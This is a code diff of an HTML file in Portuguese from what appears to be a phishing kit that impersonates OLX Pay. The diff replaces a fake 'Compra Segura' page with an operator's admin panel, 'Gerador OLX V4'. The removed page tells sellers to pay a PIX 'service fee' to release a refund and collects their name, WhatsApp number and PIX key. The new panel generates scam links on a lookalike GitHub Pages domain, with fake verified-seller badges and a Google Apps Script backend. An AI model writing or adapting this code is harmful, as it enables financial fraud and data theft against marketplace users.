@@ -1,233 +1,115 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Compra Segura OLX Pay</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  <style>
-    body { font-family: 'Segoe UI', sans-serif; background: #f3f3f3; margin: 0; padding: 20px; color: #333; }
-    #main-container { max-width: 480px; margin: 0 auto; }
-    .container { background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
-    .header-image { height: 8px; background: #6e0ad6; width: 100%; }
-    .header-title { background: #6e0ad6; color: #fff; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; }
-    .content { padding: 20px; }
-    .highlight { color: #00bfa5; font-weight: bold; }
-    h2 { font-size: 16px; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 20px; color: #444; }
-    p { font-size: 14px; line-height: 1.5; color: #666; }
-    .icon { color: #999; width: 20px; text-align: center; margin-right: 8px; }
-    .badge { background: #e8fcf6; color: #00bfa5; padding: 5px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; display: inline-block; margin-right: 5px; margin-bottom: 5px; }
-    
-    /* FORMULÁRIO */
-    input { width: 100%; padding: 12px; margin: 5px 0 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-    button { width: 100%; padding: 15px; background: #f28000; color: #fff; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
-    button:hover { background: #d97300; }
-    button:disabled { background: #ccc; cursor: not-allowed; }
-
-    /* ÁREA DO PIX (NOVO) */
-    #pix-container { display: none; text-align: center; background: #f9f9f9; padding: 20px; border-radius: 8px; border: 2px dashed #00bfa5; margin-top: 20px; }
-    #pix-qrcode-img { max-width: 150px; margin-bottom: 15px; }
-    .pix-textarea { width: 100%; height: 60px; padding: 10px; font-size: 12px; background: #fff; border: 1px solid #ddd; border-radius: 4px; resize: none; color: #555; }
-    .btn-copy { background: #00bfa5; margin-top: 10px; border-radius: 6px; font-size: 14px; padding: 10px; }
-    .btn-copy:hover { background: #009e8e; }
-
-    .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
-    .hidden { display: none !important; }
-    .visible { display: block !important; animation: fadeIn 0.5s; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin - Gerador OLX V4</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  body { background:#1e1e1e; color:#fff; font-family:sans-serif; padding:20px; }
+  form { max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; border-radius:12px; }
+  input { width:100%; padding:10px; margin:5px 0 15px; background:#3a3a3a; border:1px solid #444; color:#fff; border-radius:5px; box-sizing: border-box; }
+  button { width:100%; padding:15px; background:#00bfa5; border:none; border-radius:5px; color:#fff; font-weight:bold; cursor:pointer; }
+  button:disabled { background:#555; }
+  .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); align-items:center; justify-content:center; }
+  .modal.active { display:flex; }
+  .modal-box { background:#222; padding:30px; border-radius:10px; text-align:center; width:90%; max-width:400px; border:1px solid #444; }
+  .link-box { background:#000; color:#00bfa5; padding:10px; word-break:break-all; margin:15px 0; font-family:monospace; border:1px dashed #333; }
+</style>
 </head>
 <body>
 
-  <div id="main-container">
-    <div style="text-align:center; margin-top:50px; color:#666;">
-      <i class="fa-solid fa-circle-notch fa-spin" style="font-size:30px; color:#6e0ad6;"></i>
-      <p>Carregando transação...</p>
-    </div>
+<form id="adminForm">
+  <h2 style="text-align:center; color:#00bfa5;">Novo Pedido</h2>
+  
+  <label>Comprador</label>
+  <input type="text" name="comprador" required placeholder="Nome completo">
+  
+  <label>Link Pagamento (Base)</label>
+  <input type="text" name="linkPagamento" id="linkPagamento" placeholder="Carregando...">
+
+  <label>Taxa de Serviço (Que aparecerá para o cliente)</label>
+  <input type="text" name="taxa" class="money" placeholder="R$ 0,00">
+
+  <input type="hidden" name="valor" value="R$ 1.200,00">
+  <input type="hidden" name="prazo" value="10 minutos">
+  <input type="hidden" name="frete" value="Grátis">
+  <input type="hidden" name="tarifa" value="Inclusa">
+  <input type="hidden" name="cpf" value="***.***.***-**">
+  <input type="hidden" name="cartao" value="PIX">
+  <input type="hidden" name="vendas" value="Vendedor Verificado">
+  <input type="hidden" name="atendimento" value="Nota 5.0">
+  <input type="hidden" name="entrega" value="Envio Imediato">
+  
+  <button type="submit" id="btnSalvar">Gerar Link</button>
+</form>
+
+<div class="modal" id="modalSuccess">
+  <div class="modal-box">
+    <h3>Link Gerado!</h3>
+    <div class="link-box" id="finalLink">...</div>
+    <button onclick="copiarLink()">Copiar</button>
+    <br><br>
+    <button onclick="location.reload()" style="background:transparent; border:1px solid #555;">Novo</button>
   </div>
+</div>
 
-  <script>
-    /**
-     * 🏛️ ARQUITETO DE SOLUÇÕES - FRONTEND CLIENT V5 (FINAL)
-     * Objetivo: Gerar PIX Copia e Cola na mesma tela.
-     */
+<script>
+// ⚙️ CONFIGURAÇÃO
+const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
+const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
 
-    // ========================================================
-    // ⚙️ CONFIGURAÇÃO: COLE AQUI SUA URL DO GOOGLE APPS SCRIPT
-    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
-    // ========================================================
+const form = document.getElementById('adminForm');
+const inputLink = document.getElementById('linkPagamento');
 
-    const mainContainer = document.getElementById('main-container');
+// Máscara Moeda
+document.querySelector('.money').addEventListener('input', (e) => {
+  let v = e.target.value.replace(/\D/g,'');
+  e.target.value = (parseFloat(v)/100).toLocaleString('pt-BR',{style:'currency', currency:'BRL'});
+});
 
-    // 1. INICIALIZAÇÃO
-    (async function init() {
-      const params = new URLSearchParams(window.location.search);
-      const id = params.get('id');
+// Carregar Último Link
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+    const res = await fetch(`${BACKEND_URL}?action=getLastLink`);
+    const json = await res.json();
+    if(json.link) inputLink.value = json.link;
+  } catch(e) { console.log(e); }
+});
 
-      if (!id) return renderError('Link inválido.');
+// Salvar
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = document.getElementById('btnSalvar');
+  btn.disabled = true; btn.innerText = "Gerando...";
 
-      try {
-        const response = await fetch(`${WEB_APP_URL}?action=get&id=${id}`);
-        const json = await response.json();
+  const data = {};
+  new FormData(form).forEach((v,k)=> data[k]=v);
+  data.linkPagamento = inputLink.value;
 
-        if (json.status === 'success') {
-          renderContainer(json.data, id);
-        } else {
-          renderError(json.message || 'Produto não encontrado.');
-        }
-      } catch (err) {
-        renderError('Erro de conexão. Recarregue a página.');
-      }
-    })();
-
-    // 2. RENDERIZAÇÃO DA TELA
-    function renderContainer(dadosBrutos, produtoId) {
-      const dados = normalizeKeys(dadosBrutos);
-      mainContainer.innerHTML = '';
-
-      const container = document.createElement('div');
-      container.className = 'container';
-
-      // Conteúdo HTML Dinâmico
-      container.innerHTML = `
-        <div class="header-image"></div>
-        <div class="header-title">Compra Segura com OLX Pay</div>
-        <div class="content">
-          <p>🎉 <span class="highlight">Parabéns!</span> Venda iniciada.</p>
-          <p>Pague a taxa de <span class="highlight" id="txt-taxa">${dados.taxa || 'R$ --'}</span> para liberar o reembolso imediato de <span class="highlight">${dados.valor || 'R$ --'}</span>.</p>
-          
-          <h2>Resumo</h2>
-          <p><i class="fa-solid fa-user icon"></i> <strong>Comprador:</strong> ${dados.comprador || '---'}</p>
-          <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor:</strong> ${dados.valor || '---'}</p>
-          <p><i class="fa-solid fa-credit-card icon"></i> <strong>Método:</strong> PIX</p>
-
-          <div style="margin-top:15px">
-            ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
-            ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
-          </div>
-
-          <h2>Dados para Liberação</h2>
-          
-          <form id="form-checkout">
-            <label style="font-size:12px; font-weight:bold; color:#666;">SEU NOME COMPLETO</label>
-            <input type="text" id="nome" required placeholder="Ex: João Silva">
-            
-            <label style="font-size:12px; font-weight:bold; color:#666;">SEU WHATSAPP</label>
-            <input type="tel" id="telefone" required placeholder="(00) 90000-0000">
-
-            <label style="font-size:12px; font-weight:bold; color:#666;">CHAVE PIX (PARA RECEBER)</label>
-            <input type="text" id="pix" required placeholder="CPF, Email ou Telefone">
-
-            <button type="submit" id="btn-enviar">Gerar PIX da Taxa</button>
-            <p id="msg-status" style="text-align:center; margin-top:10px; font-size:13px;"></p>
-          </form>
-
-          <div id="pix-container">
-            <h3 style="color:#00bfa5; margin:0 0 10px;">✅ Pagamento Gerado!</h3>
-            <p style="font-size:12px;">Copie o código abaixo e pague no seu app de banco:</p>
-            
-            <img id="pix-qrcode-img" src="" style="display:none;"> 
-            
-            <textarea id="pix-copia-cola" class="pix-textarea" readonly></textarea>
-            
-            <button type="button" class="btn-copy" id="btn-copiar">
-              <i class="fa-regular fa-copy"></i> Copiar Código PIX
-            </button>
-            
-            <div style="margin-top:15px; font-size:11px; color:#999;">
-              <i class="fa-solid fa-clock"></i> Aguardando confirmação automática...
-            </div>
-          </div>
-
-        </div>
-        <div class="footer">© 2025 OLX Pay. Segurança Garantida.</div>
-      `;
-
-      mainContainer.appendChild(container);
-
-      // 3. LÓGICA DE CHECKOUT (PIX NA TELA)
-      const form = document.getElementById('form-checkout');
-      const pixContainer = document.getElementById('pix-container');
-      const btnEnviar = document.getElementById('btn-enviar');
-      const msgStatus = document.getElementById('msg-status');
-      const txtPix = document.getElementById('pix-copia-cola');
-      const btnCopiar = document.getElementById('btn-copiar');
-
-      form.addEventListener('submit', async (e) => {
-        e.preventDefault();
-
-        // Bloqueia UI
-        btnEnviar.disabled = true;
-        btnEnviar.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Gerando PIX...';
-        msgStatus.textContent = "";
-
-        const formData = {
-          nome: document.getElementById('nome').value,
-          telefone: document.getElementById('telefone').value,
-          pix: document.getElementById('pix').value, // Chave Pix onde o cliente quer receber a venda
-          produto_id: produtoId
-        };
-
-        try {
-          // CHAMA O GAS
-          const response = await fetch(`${WEB_APP_URL}?action=checkout`, {
-            method: 'POST',
-            body: JSON.stringify(formData)
-          });
-
-          const result = await response.json();
-
-          if (result.status === 'success') {
-            // === SUCESSO: EXIBE O PIX ===
-            form.style.display = 'none'; // Esconde o formulário
-            pixContainer.style.display = 'block'; // Mostra o Pix
-            pixContainer.classList.add('visible');
-
-            // Preenche o Copia e Cola
-            // Se a API não mandar 'pix_copypaste', usamos o 'payment_link' como fallback
-            const codigoPix = result.pix_copypaste || result.payment_link;
-            txtPix.value = codigoPix;
-
-            // Lógica do Botão Copiar
-            btnCopiar.onclick = () => {
-              navigator.clipboard.writeText(codigoPix);
-              btnCopiar.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
-              btnCopiar.style.background = '#4CAF50';
-            };
-
-            // Se tiver imagem de QR Code, exibe
-            /* if(result.pix_qrcode) {
-               document.getElementById('pix-qrcode-img').src = result.pix_qrcode; 
-               document.getElementById('pix-qrcode-img').style.display = 'inline-block';
-            } 
-            */
-
-          } else {
-            throw new Error(result.message || 'Erro ao gerar PIX.');
-          }
-
-        } catch (error) {
-          console.error(error);
-          btnEnviar.disabled = false;
-          btnEnviar.innerHTML = 'Tentar Novamente';
-          msgStatus.innerHTML = `<span style="color:red">❌ ${error.message}</span>`;
-        }
-      });
+  try {
+    const res = await fetch(`${BACKEND_URL}?action=create`, {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+    const json = await res.json();
+    
+    if(json.status === 'success') {
+      document.getElementById('finalLink').innerText = `${CLIENTE_URL}?id=${json.id}`;
+      document.getElementById('modalSuccess').classList.add('active');
+    } else {
+      alert('Erro: ' + json.message);
     }
+  } catch(err) { alert('Erro de conexão'); }
+  
+  btn.disabled = false; btn.innerText = "Gerar Link";
+});
 
-    // Helpers
-    function normalizeKeys(obj) {
-      const newObj = {};
-      Object.keys(obj).forEach(k => newObj[k.toLowerCase()] = obj[k]);
-      // Aliases
-      newObj.valor = newObj.valor || newObj['valor total'];
-      newObj.taxa = newObj.taxa || newObj['taxa de serviço'];
-      return newObj;
-    }
+function copiarLink() {
+  navigator.clipboard.writeText(document.getElementById('finalLink').innerText);
+  alert('Copiado!');
+}
+</script>
 
-    function renderError(msg) {
-      mainContainer.innerHTML = `<div style="text-align:center; padding:50px; color:#666;"><h3>Atenção</h3><p>${msg}</p></div>`;
-    }
-  </script>
 </body>
 </html>
